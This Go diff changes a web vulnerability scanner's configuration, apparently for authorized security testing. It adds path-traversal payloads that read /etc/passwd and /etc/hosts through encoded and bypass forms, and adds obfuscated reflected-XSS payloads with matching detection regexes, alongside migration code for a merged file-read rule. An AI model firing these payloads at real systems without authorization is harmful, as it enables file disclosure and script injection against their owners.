@@ -15,7 +15,7 @@ import (
 	"sync"
 )
 
-const currentConfigVersion = 33
+const currentConfigVersion = 35
 
 type SessionIdentifier struct {
 	Location string `json:"location"`
@@ -347,7 +347,7 @@ func defaultPluginRules() map[string]PluginRuleConfig {
 			},
 		},
 		"file_read": {
-			ParameterNames: []string{"file", "path", "filename", "filepath", "download", "template", "resource", "document", "dir", "attachment"},
+			ParameterNames: []string{"file", "path", "filename", "filepath", "download", "template", "resource", "document", "dir", "attachment", "fileName", "filePath", "fileKey", "resourcePath", "downloadPath"},
 			Payloads: []PayloadRule{
 				{Name: "passwd 目录穿越", Payload: "../../../../../../etc/passwd", Expected: `(?m)^root:x?:0:0:`},
 				{Name: "passwd 绝对路径", Payload: "/etc/passwd", Expected: `(?m)^root:x?:0:0:`},
@@ -362,6 +362,15 @@ func defaultPluginRules() map[string]PluginRuleConfig {
 				{Name: "proc/version 双重编码穿越", Payload: "%2e%2e%252f%2e%2e%252fproc%252fversion", Expected: `(?im)^Linux version [0-9]+\.[0-9]+(?:\.[0-9]+)?[^\r\n]{0,300}$`, Mode: "deep"},
 				{Name: "hosts 非标准路径归一化", Payload: "....//....//....//....//....//....//etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
 				{Name: "hosts file URI", Payload: "file:///etc/hosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
+				{Name: "passwd URL 编码穿越", Payload: "%2e%2e%2f%2e%2e%2fetc%2fpasswd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
+				{Name: "passwd 双重 URL 编码穿越", Payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
+				{Name: "passwd 混合编码穿越", Payload: "..%2f..%2f..%2f..%2fetc%2fpasswd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
+				{Name: "hosts URL 编码穿越", Payload: "%2e%2e%2f%2e%2e%2fetc%2fhosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
+				{Name: "hosts 双重 URL 编码穿越", Payload: "%252e%252e%252f%252e%252e%252fetc%252fhosts", Expected: `(?m)^(?:127\.0\.0\.1|::1)[\t ]+(?:localhost(?:\.localdomain)?|ip6-localhost)(?:[\t ]|$)`, Mode: "deep"},
+				{Name: "proc/version URL 编码穿越", Payload: "%2e%2e%2f%2e%2e%2fproc%2fversion", Expected: `(?im)^Linux version [0-9]+\.[0-9]+(?:\.[0-9]+)?[^\r\n]{0,300}$`, Mode: "deep"},
+				{Name: "点号分号路径绕过", Payload: "..;/..;/..;/..;/etc/passwd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
+				{Name: "file URI 编码绕过", Payload: "file:%2f%2f%2fetc%2fpasswd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
+				{Name: "file URI localhost", Payload: "file://localhost/etc/passwd", Expected: `(?m)^root:x?:0:0:`, Mode: "deep"},
 			},
 		},
 		"file_upload": {Payloads: []PayloadRule{
@@ -575,6 +584,31 @@ func defaultPluginRules() map[string]PluginRuleConfig {
 		"csrf": {Payloads: []PayloadRule{{Name: "跨站 Origin", Kind: "origin", Payload: "https://jungle-happy-scan.invalid"}}},
 		"idor": {ParameterNames: []string{"id", "uid", "uuid", "user", "account", "order", "document", "record"}},
 	}
+	quickXSS := rules["reflected_xss"]
+	quickXSS.Payloads = append(quickXSS.Payloads,
+		PayloadRule{Name: "HTML IMG onerror", Kind: "html-text", Payload: `{{token}}<img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "HTML IMG onerror confirm", Kind: "html-text", Payload: `{{token}}<img src=x onerror=confirm(1)>`},
+		PayloadRule{Name: "HTML details ontoggle", Kind: "html-text", Payload: `{{token}}<details open ontoggle=confirm(1)>`},
+		PayloadRule{Name: "标签 IMG onerror", Kind: "tag", Payload: `{{token}}><img src=x onerror=alert(1)>`},
+	)
+	rules["reflected_xss"] = quickXSS
+	deepXSS := PluginRuleConfig{Payloads: append([]PayloadRule(nil), quickXSS.Payloads...)}
+	deepXSS.Payloads = append(deepXSS.Payloads,
+		PayloadRule{Name: "HTML IMG onerror 反引号自索引", Kind: "html-text", Payload: "{{token}}<img src=x onerror =\"self[0X10f8809.toString`36`]`1`\">"},
+		PayloadRule{Name: "HTML IMG 无空格属性", Kind: "html-text", Payload: `{{token}}<img/src=x/onerror=alert(1)>`},
+		PayloadRule{Name: "HTML VIDEO source onerror", Kind: "html-text", Payload: `{{token}}<video><source onerror=alert(1)>`},
+		PayloadRule{Name: "HTML IMG 反引号函数", Kind: "html-text", Payload: "{{token}}<img src=x onerror=x=alert,x`1`>"},
+		PayloadRule{Name: "HTML IMG Object.bind", Kind: "html-text", Payload: `{{token}}<img src=x onerror=Object.bind(null,alert)()(1)>`},
+		PayloadRule{Name: "HTML IMG Symbol.replace", Kind: "html-text", Payload: `{{token}}<img src=x onerror=/1/[Symbol.replace]('1',alert)>`},
+		PayloadRule{Name: "双引号属性 IMG onerror", Kind: "attribute-double", Payload: `{{token}}"><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "单引号属性 IMG onerror", Kind: "attribute-single", Payload: `{{token}}'><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "无引号属性 IMG onerror", Kind: "attribute-unquoted", Payload: `{{token}}><img src=x onerror=alert(1)>`},
+		PayloadRule{Name: "脚本单引号反引号函数", Kind: "script-single", Payload: "{{token}}';x=alert,x`1`;//"},
+		PayloadRule{Name: "脚本双引号反引号函数", Kind: "script-double", Payload: "{{token}}\";x=alert,x`1`;//"},
+		PayloadRule{Name: "脚本代码反引号函数", Kind: "script-code", Payload: "{{token}};x=alert,x`1`;//"},
+		PayloadRule{Name: "标签 IMG 反引号自索引", Kind: "tag", Payload: "{{token}}><img src=x onerror =\"self[0X10f8809.toString`36`]`1`\">"},
+	)
+	rules["reflected_xss_deep"] = deepXSS
 	sensitive := rules["sensitive_data"]
 	for i := range sensitive.Patterns {
 		sensitive.Patterns[i].Validator = legacyValidator(sensitive.Patterns[i].Name)
@@ -589,6 +623,10 @@ func defaultPluginRules() map[string]PluginRuleConfig {
 // explicit, independently selectable plugin rule sets. Payload.Mode remains in
 // the JSON struct only so older configuration files can be migrated safely.
 func splitDeepPluginRules(rules map[string]PluginRuleConfig) {
+	// V3.12 folds the former encoded file-read bucket back into the single
+	// file_read rule. Keep its payloads marked deep so the normal/deep scan mode
+	// still controls request volume, while old config files remain usable.
+	mergeFileReadPluginRules(rules)
 	// The old MyBatis "deep variant" is the same destructive canary family as
 	// the normal rule with an added DESC token. There is no separate extension
 	// plugin for it, so retaining Mode and later clearing it made the legacy
@@ -619,7 +657,6 @@ func splitDeepPluginRules(rules map[string]PluginRuleConfig) {
 			return "sqli_extended"
 		}},
 		{source: "xxe", target: func(PayloadRule) string { return "xxe_extended" }},
-		{source: "file_read", target: func(PayloadRule) string { return "file_read_encoded" }},
 		{source: "file_upload", target: func(PayloadRule) string { return "file_upload_execution" }},
 		{source: "java_expression", target: func(PayloadRule) string { return "java_expression_extended" }},
 		{source: "mass_assignment", target: func(PayloadRule) string { return "mass_assignment_extended" }},
@@ -663,10 +700,55 @@ func splitDeepPluginRules(rules map[string]PluginRuleConfig) {
 	// their existing plugin. Selecting that plugin always means the same work.
 	for pluginID, rule := range rules {
 		for index := range rule.Payloads {
-			rule.Payloads[index].Mode = ""
+			if pluginID != "file_read" {
+				rule.Payloads[index].Mode = ""
+			}
 		}
 		rules[pluginID] = rule
 	}
+}
+
+// mergeFileReadPluginRules migrates the V2/V3 split file_read_encoded bucket
+// into file_read. Payloads that came from the legacy bucket are explicitly
+// marked deep; custom parameter names, paths and patterns are retained.
+func mergeFileReadPluginRules(rules map[string]PluginRuleConfig) {
+	if rules == nil {
+		return
+	}
+	legacy, ok := rules["file_read_encoded"]
+	if !ok {
+		return
+	}
+	primary := rules["file_read"]
+	primary.ParameterNames = mergeUniqueStrings(primary.ParameterNames, legacy.ParameterNames)
+	primary.URLKeywords = mergeUniqueStrings(primary.URLKeywords, legacy.URLKeywords)
+	primary.Paths = mergeUniqueStrings(primary.Paths, legacy.Paths)
+	primary.AllowPaths = mergeUniqueStrings(primary.AllowPaths, legacy.AllowPaths)
+	seenPayload := make(map[string]bool, len(primary.Payloads)+len(legacy.Payloads))
+	for _, payload := range primary.Payloads {
+		seenPayload[payload.Name+"\x00"+payload.Payload] = true
+	}
+	for _, payload := range legacy.Payloads {
+		payload.Mode = "deep"
+		key := payload.Name + "\x00" + payload.Payload
+		if !seenPayload[key] {
+			primary.Payloads = append(primary.Payloads, payload)
+			seenPayload[key] = true
+		}
+	}
+	seenPattern := make(map[string]bool, len(primary.Patterns)+len(legacy.Patterns))
+	for _, pattern := range primary.Patterns {
+		seenPattern[pattern.Name+"\x00"+pattern.Pattern] = true
+	}
+	for _, pattern := range legacy.Patterns {
+		key := pattern.Name + "\x00" + pattern.Pattern
+		if !seenPattern[key] {
+			primary.Patterns = append(primary.Patterns, pattern)
+			seenPattern[key] = true
+		}
+	}
+	rules["file_read"] = primary
+	delete(rules, "file_read_encoded")
 }
 
 func defaultSMSPayloads() []PayloadRule {
@@ -1075,7 +1157,13 @@ func upgradeConfig(cfg *Config) {
 		if cfg.ConfigVersion < 32 {
 			cfg.PluginRules["sqli_timing"] = mergePluginRuleDefaults(cfg.PluginRules["sqli_timing"], Default().PluginRules["sqli_timing"])
 		}
+		if cfg.ConfigVersion < 34 {
+			defaults := Default()
+			cfg.PluginRules["reflected_xss"] = mergePluginRuleDefaults(cfg.PluginRules["reflected_xss"], defaults.PluginRules["reflected_xss"])
+			cfg.PluginRules["reflected_xss_deep"] = mergePluginRuleDefaults(cfg.PluginRules["reflected_xss_deep"], defaults.PluginRules["reflected_xss_deep"])
+		}
 		upgradeV39(cfg)
+		upgradeV312(cfg)
 		cfg.ConfigVersion = currentConfigVersion
 		return
 	}
@@ -1135,7 +1223,10 @@ func upgradeConfig(cfg *Config) {
 		cfg.PluginRules = make(map[string]PluginRuleConfig)
 	}
 	// V2.0 config v15 migrates every historical mode=deep payload into an
-	// explicit extension plugin before recommended defaults are merged.
+	// explicit extension plugin before recommended defaults are merged. V3.12
+	// runs first so a legacy file_read_encoded bucket is still visible while its
+	// new unified defaults are appended.
+	upgradeV312(cfg)
 	splitDeepPluginRules(cfg.PluginRules)
 	// V3.6.2 replaces the original query value for the quoted MySQL timing
 	// oracle. Appending to a non-empty value produces a different SQL context
@@ -1293,9 +1384,10 @@ func upgradeConfig(cfg *Config) {
 		"java_deserialization", "method_override", "mass_assignment", "graphql_security",
 		"mybatis_dynamic_sql", "path_normalization", "parameter_confusion", "json_polymorphic",
 		"sms_abuse", "shiro", "java_expression", "jndi_injection", "host_header_injection",
-		"sqli_extended", "sqli_timing", "sqli_order_by", "sqli_limit", "xxe_extended", "file_read_encoded", "file_upload_execution",
+		"sqli_extended", "sqli_timing", "sqli_order_by", "sqli_limit", "xxe_extended", "file_upload_execution",
 		"command_injection_oast", "command_injection_timing", "java_expression_extended",
 		"mass_assignment_extended", "graphql_alias_abuse", "error_disclosure_extended",
+		"reflected_xss", "reflected_xss_deep",
 	} {
 		cfg.PluginRules[pluginID] = mergePluginRuleDefaults(cfg.PluginRules[pluginID], defaults.PluginRules[pluginID])
 	}
@@ -1306,6 +1398,28 @@ func upgradeConfig(cfg *Config) {
 	repairSQLTimingControls(cfg.PluginRules)
 	upgradeV39(cfg)
 	cfg.ConfigVersion = currentConfigVersion
+}
+
+// upgradeV312 folds the former encoded file-read rule bucket into the unified
+// scanner and appends newly recommended matching/payload defaults while keeping
+// user supplied values authoritative.
+func upgradeV312(cfg *Config) {
+	if cfg == nil {
+		return
+	}
+	if cfg.PluginRules == nil {
+		cfg.PluginRules = make(map[string]PluginRuleConfig)
+	}
+	defaults := Default()
+	_, hadLegacyFileRead := cfg.PluginRules["file_read_encoded"]
+	mergeFileReadPluginRules(cfg.PluginRules)
+	if hadLegacyFileRead || len(cfg.PluginRules["file_read"].Payloads) == 0 {
+		cfg.PluginRules["file_read"] = mergePluginRuleDefaults(cfg.PluginRules["file_read"], defaults.PluginRules["file_read"])
+	}
+	cfg.PluginRules["sms_abuse"] = mergePluginRuleDefaults(cfg.PluginRules["sms_abuse"], defaults.PluginRules["sms_abuse"])
+	// Save() performs the final canonical split/mode cleanup; leave the
+	// unified file-read deep markers intact here so standard and deep scans can
+	// still choose their respective payload tiers after an in-memory upgrade.
 }
 
 func mergeUniqueStrings(configured, recommended []string) []string {
@@ -1381,10 +1495,12 @@ func (s *Store) Path() string { return s.path }
 
 func (s *Store) Save(cfg Config) error {
 	// Canonicalize a submitted configuration before validating and persisting it.
-	// This also migrates legacy mode=deep payloads into explicit extension plugin
-	// rules, so the stored behavior never depends on an invisible scan mode.
+	// This migrates legacy mode=deep payloads into explicit extension plugin
+	// rules; the unified file_read rule deliberately retains its deep markers so
+	// the selected Normal/Deep scan mode can choose the appropriate tier.
 	cfg = clone(cfg)
 	cfg.ExcludedParameterNames = normalizeUniqueNames(cfg.ExcludedParameterNames)
+	mergeFileReadPluginRules(cfg.PluginRules)
 	splitDeepPluginRules(cfg.PluginRules)
 	cfg.NormalPlugins = NormalizeSQLPluginIDs(cfg.NormalPlugins, true)
 	repairSQLTimingControls(cfg.PluginRules)
